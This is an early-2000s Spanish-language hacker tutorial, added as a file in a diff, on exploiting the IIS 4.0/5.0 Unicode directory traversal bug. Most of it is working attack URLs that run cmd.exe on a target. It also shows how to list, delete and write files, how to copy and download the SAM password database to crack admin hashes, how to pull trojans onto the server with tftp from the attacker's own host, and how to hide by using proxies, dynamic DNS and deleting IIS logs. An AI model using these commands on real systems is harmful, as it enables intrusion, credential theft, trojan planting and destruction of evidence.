@@ -1,0 +1,229 @@
+               -------------------------------
+               -           UNICODE  FINAL    -
+               -                by leon01    -
+               -DISIDENTS LOS FUERA DE LA LEY-
+               -------------------------------
+
+
+	La  idea de esta charla es comentar y aprender a implementar el Unicode,
+seguramente algunos de ustedes hallan esplotado este bug y sabran la mayoria
+de los temas (te encontraras con la duda de como subir archivos o acceder a
+las sam)voy a intentar (primero)  explicar que es el bug tranversal Unicode para
+mircosft IIS4.0 y 5.0 (que son los conocidos windows NT y win2k)
+el bug se basa en una vulnerabilidad de escalada de directorios, lo que hace
+es solicitar un archivo dentro de un subdirectorio (ejemplo ..%c1%1c.. ;
+%c0%af..; ect) en el directorio "virtual" (ejemplo: scripts, msadc) del servidor IIS,
+este al no encontrar el archivo (un error del unicode al interpretar los
+codigos "/" CGI) nos devolvera el archivo de c:/imepud/.. pero no entremos tanto en
+detalles.
+Apesar de que este bug ya tiene un tiempo todavia lo encontramos por
+interminables servers, Microsoft dio aviso del mismo el 17 de octubre de 2000
+mediante el boletin  MS00-078, pero a pesar de esto hay muchos Admin que no parecen
+haberse enterado de su existencia (como dice vur-burn el miedo es libre cada uno elige)
+¿Como es que comprobamos si un servidor tiene este bug? pues es muy facil, lo
+hacemos desde nuestro explorador. Supongamos que queremos saber si el servidor de wwww.argentinafull.com (esta web es solo un ejemplo), en el explorador pondriamos
+http://www.argentinafull.com/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\
+y nos deberia salir listado del raíz del disco C (mirar al final que el
+comando es c+dir+c: - directorio del disco c:)
+no es la unica variante a probar si esta no fuciona deberias ir probando de
+una a una las siguientes:
+
+http://www.argentinafull.com/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir+c:\
+http://www.argentinafull.com/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\
+http://www.argentinafull.com/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir+c:\
+http://www.argentinafull.com/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir+c:\
+http://www.argentinafull.com/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+c:\
+http://www.argentinafull.com/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir
++c:\
+http://www.argentinafull.com/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\
+http://www.argentinafull.com/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\
+http://www.argentinafull.com/iisadmpwd/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\
+
+La mejor forma, en vez de probar uno por uno y server por server, es
+utilizar un scaner como el Shadowscan, editando todas estas variables el
+archivo cgi.txt. Existe tambien un scaner preparado para esto, el URLscaner del
+SSH team,aunque personalmente les recomiendo el Shadowscan que mucho mas rapido
+(tambien se puede usar el cgiscan modificando el archivo data.txt).
+Al final de charla les dare la direccion donde bajarse el URLscaner (para win y
+para linux) ademas tambien hay un exploit bastante util.
+Como veran en el los comandos unicode que puse antes al final del mismo es
+/c+dir+c:\ donde el comando dir llama al unidad de disco c:
+Tal vez no encontremos el bug en esa unidad asi que deberemos movernos por
+/c+dir+d:\ /c+dir+e:\ ect .. recordar esto para agregarlo a los scanner.
+
+
+
+ejemplo de un directorio web:
+Directorio de c:\
+
+17/11/2000  11:50       <DIR>          Archivos de programa
+28/04/2001  11:46       <DIR>          arregla_este_agujero_leon
+23/04/2001  13:56       <DIR>          Buzon
+25/04/2001  13:13       <DIR>          Computo
+12/10/2000  10:39       <DIR>          Corel
+24/10/2000  13:19       <DIR>          Disco de Instalción de Winodws 2000
+30/10/2000  20:47       <DIR>          Documents and Settings
+29/09/2000  13:02       <DIR>          Inetpub
+
+06/11/2000  11:58       <DIR>          My Download Files
+31/01/2001  11:37       <DIR>          My Music
+17/11/2000  11:45       <DIR>          Program Files
+27/02/2001  12:43               43.520 requerimientos 2001 DGSCA.doc
+29/01/2001  13:30            2.162.688 s170.a
+29/01/2001  13:30            2.162.688 s170.b
+06/12/2000  18:54            6.160.384 s1ek.3
+28/04/2001  11:03       <DIR>          Siabuc21
+24/10/2000  12:16       <DIR>          Solicitud
+27/04/2001  14:08       <DIR>          TEMP
+24/10/2000  12:36       <DIR>          Users
+01/02/2001  11:59       <DIR>          WINNT
+12/10/2000  10:25              104.990 wtge61es.HST
+19/01/2001  12:56                    0 ~WRD0000.tmp
+               8 archivos     10.658.485 bytes
+              18 dirs   2.583.285.760 bytes libres
+
+Mirar el directorio arregla_este_agujero_leon que es de hoy (ver fecha)
+
+Ahora pasemos a los comandos: el unicode funciona como si fuera una consola
+DOS por telnet, esto es porque en el comando estamos ejecutando el archivo
+cmd.exe (equivalente al command.com del DOS), osea que muchos de lo comandos
+seran del DOS. Ejemplos:
+Crear directorio:
+http://www.argentinafull.com/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+md+c:\el_leon01
+<--- el_leon01 es el directorio creado en el c: (ver que el comando es ¨md¨
+como en el viejo DOS) a antes que me elvide el rd para borrar directorios
+Borrar archivos:
+http://wwww.argentinafull.com/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+del+c:\archivo.extencion
+Ver txt :
+http://wwww.argentinafull.com/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+type+c:\archivo.txt
+Escribir en un .txt:
+http://wwww.argentinafull.com/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/C+echo+texto+>c:\nombre.txt
+(done dice texto colocas el contenido del txt)
+Copiar archivos:
+http://wwww.argentinafull.com/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+copy+c:\archivo.extencion
+Bajar: Primero copias el archivo y luego pones:
+http://wwww.argentinafull.com/msadc/archivo.extencion y bajara automaticamente
+Renombrar archivos:
+http://wwww.argentinafull.com/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+ren+c:\c:archivo.extencion
+nuevo_nombre.extencion
+bueno estos son solo unos comandos (hasta tecnicas de formateo) buscar ese
+viejo libro de Dos que ¨duerme¨ en la biblioteca de sus casas y buscar mas
+comandos ahi (en mi caso ¨todo dos 6.1¨ je)
+NOTA: Para escalar directorios \etc\etc\etc se utiliza la barra "\" ( ALT 92 )
+Expliquemos un poco mas como copiar y bajar archivos:
+Supongamos que queremos copiar las SAM (dependera del acceso que nos brindre
+el admin)
+Para poder bajar un archivo necesiramos ¨pegarlo¨ en el directorio compartido
+por web (c:inetpub/wwwroot/) con el comando
+http://wwww.argentinafull.com/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy
+c:winnt/repair/sam._+c:inetpub/wwwroot
+con este comando copiamos el sam a wwwroot, luego para bajarlos solo pon
+http://wwww.argentinafull.com/sam._
+despues te queda a ti usar algun crackeador de pass pada obtener las hashes
+(trozos de claves) del admin
+Los sam lo podemos mirar de esta forma
+Directorio de c:\WINNT\repair
+
+http://www.XXXXXX.XX/scripts/..%c1%9c../winnt/system32/cmd.exe?/c%20dir%20c:\"WINNT"\"repair"
+
+29/09/2000  12:44       <DIR>          .
+29/09/2000  12:44       <DIR>          ..
+15/12/1999  19:00                  532 autoexec.nt
+29/09/2000  12:42                2.909 config.nt
+29/09/2000  12:50              118.784 default
+29/09/2000  12:50               16.384 sam
+29/09/2000  12:44              522.940 secsetup.inf
+29/09/2000  12:50               16.384 security
+29/09/2000  12:40              141.315 setup.log
+29/09/2000  12:50            5.877.760 software
+29/09/2000  12:49            1.003.520 system
+               9 archivos      7.700.528 bytes
+               2 dirs   2.583.285.760 bytes libres
+
+jugar vosotros para coger el sam de
+http://www.XXXXX.XX/scripts/..%c1%9c../winnt/system32/cmd.exe?/c%20dir%20c:\"WINNT"\"system32"\"config"\
+
+Ahora veamos lo mas dificil Subir archivos
+Para que querriamos subir archivos? la respuesta es sencilla desde cambiar el
+index.htm hasta subir un troyano.
+
+¨A primera vista, no se pueden subir ni bajar archivos del servidor,
+ ya que DOS no provee programas de línea de comando que se manejen con
+parámetros y establezcan y mantengan una conección TCP/IP hasta enviado o recibido un
+archivo¨ Les pego un txt muy util
+
+Lo primero que tendremos que hacer es conseguir un cliente TFTP e instalarlo en
+nuestra máquina. Si usan Linux es muy probable que tengan un cliente TFTP por
+algún lado, así que sólo tendrían que instalarlo y configurarlo.
+Si usan Win32 pueden conseguir el TFTPD32 (Trivial FTP Daemon)
+en members.tripod.fr/phjounin/P_tftpd32.htm
+Lo único que necesitarán configurar en el TFTPD32 es el directorio base (es
+decir, el directorio en el que están los archivos que luego subiremos al
+servidor).
+
+La sintáxis que debemos usar el la siguiente:
+
+http://www.servidor.com/scripts/..%c0%af../winnt/ (sigue abajo)
+system32/tftp.exe+"-i"+1.1.1.1+GET+archivo.ext+C:\destino\archivo.ext
+
+Explicación:
+tftp.exe	Cliente TFTP (viene con WinNT y Win2K).
+"-i"	Indica que el archivo a subir al servidor es binario. Es importante poner
+las "comillas". Si el archivo es de texto (un script, por ejemplo) debemos
+eliminar este parámetro.
+1.1.1.1	IP o dirección del servidor en el que está instalado el daemon TFTP
+(en este caso nuestra PC).
+GET	Indica la acción a realizar. En este caso obtener un archivo del servidor
+TFTP (nuestra PC).
+
+Para tener en cuenta
+Algunos servidores tienen deshabilitado el port 69 <--- esto es fundamental
+(el que usa el protocolo TFTP) o tienen alguna tipo de protección que impide
+que la conexión se realice con éxito. Por este motivo en algunos servidores no
+podrán aprovechar esta vulnerabilidad (al menos no de esta forma).
+Si el daemon TFTP les indica que el pedido de download fue efectuado, pero ven
+que el archivo "no se va", lo más probable es que no puedan transferir el
+archivo.
+
+Cuando un servidor remoto permite transferir archivos a través de TFTP, los
+archivos no tardarán más de uno o dos segundos en empezar a transferirse, así
+que si ven que pasan los segundos y el archivo "no se va" dense por vencidos e
+intenten en otro servidor ;-)
+
+Consejos
+Como ya deben saber, para evitar ser "rastreados" (o más bien, para hacer más
+dificil el rastreo) siempre es conveniente usar un servidor proxy.
+ Si usan un proxy en los logs del IIS aparecerá el IP del proxy server, y no
+el de ustedes. Ok, esto ya es sabido, pero ¿a qué viene todo esto?
+A que si a la hora de transferir archivos usan su IP como server TFTP, el
+servidor proxy no les servirá de nada, ya que su IP quedará logueado en los
+logs del IIS, junto con la hora, y el archivo que transfirieron al servidor.
+Para evitar esto lo mejor es abrir una cuenta en alguno de esos servicios de
+DNS dinámico (en adelante, "cuenta de DNS dinámico", por más que esté mal)
+como www.dhs.org, especialmente para esto. Luego consiganse algún programita
+que les actualice el IP automáticamente.
+Ahora pueden ejecutar el cliente TFTP de esta manera (por ejemplo):
+http://www.servidor.com/scripts/..%c0%af../winnt/ (sigue abajo)
+system32/tftp.exe+"-i"+micuenta.dhs.org+GET+archivo.ext+C:\destino\archivo.ext
+Para que todo esto tenga alguna utilidad
+es muy importante que cada vez que no usen la cuenta de DNS dinámico setéen su
+IP como, 1.1.1.1, por ejemplo, o alguna otra cosa. De esta forma,
+si alguien los descubre, y mirá en los logs, lo que encontrarán será el IP del
+proxy y la dirección de la cuenta DNS dinámico. Si intentan conseguir su IP a
+través de la cuenta de DNS dinámico,
+llegarán al IP 1.1.1.1, a menos que se hayan olvidado de setear el IP a
+1.1.1.1 o que justo en ese momento ustedes estén usando la cuenta.
+
+De mas esta decir que tambien podemos usa un troyano en la pc de algun capullo
+para ocultar nuestra IP ( pero eso es demaciado malvado para mi)
+
+igualmente si nuenstra ip kedara grabada en el servidor podriamos borrar los
+log con
+http://www.host.com/cgi-bin/cmd.exe?/c+del+c:/winnt/system32/logfiles/in010323.log
+(esperar unos minutos antes de borrar la para ke los datos se catulicen)
+si solo vamos a esplorar y no subiremos nada usen un proxy como los  que se
+publican en www.cyberarmy.com
+
+las herramientas antes nombradas estan disponibles en :
+
+ http://sshteam.8k.com/
